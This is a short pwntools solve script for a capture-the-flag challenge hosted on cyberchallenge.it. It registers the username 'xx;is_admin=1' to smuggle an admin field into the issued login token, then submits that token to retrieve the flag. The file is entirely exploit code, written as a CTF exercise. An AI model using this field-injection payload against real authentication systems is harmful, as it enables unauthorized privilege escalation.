from pwn import *

r = remote("notadmin.challs.cyberchallenge.it", 9032)

r.sendlineafter("> ", "1")
r.recvuntil("Insert your username: ")
r.sendline("xx;is_admin=1")
r.recvuntil("Your login token: ")
token = r.recvline()
r.sendlineafter("> ", "2")
r.recvuntil("Insert your token: ")

r.sendline(token)
r.recvuntil("Here is your flag ")
log.success(r.recvline().strip().decode())
r.close()
